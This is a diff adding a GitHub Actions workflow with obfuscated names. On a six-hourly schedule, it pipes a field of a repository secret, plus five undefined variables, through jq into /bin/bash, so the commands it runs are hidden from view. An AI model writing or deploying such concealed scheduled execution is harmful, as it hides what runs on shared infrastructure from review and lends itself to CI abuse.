@@ -1,0 +1,21 @@
+name: zhourulai2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhourulai2345
+        env:
+          k3: ${{ secrets.k3 }}
+        run: |
+          echo $k3 | jq -r .wxc86 | /bin/bash
+          echo $tvum649 | jq -r .inblh7 | /bin/bash
+          echo $oyncd2654 | jq -r .borp162 | /bin/bash
+          echo $uijhx9039 | jq -r .flvh209 | /bin/bash
+          echo $do06 | jq -r .rk393 | /bin/bash
+          echo $b02663 | jq -r .wyj56995 | /bin/bash
+
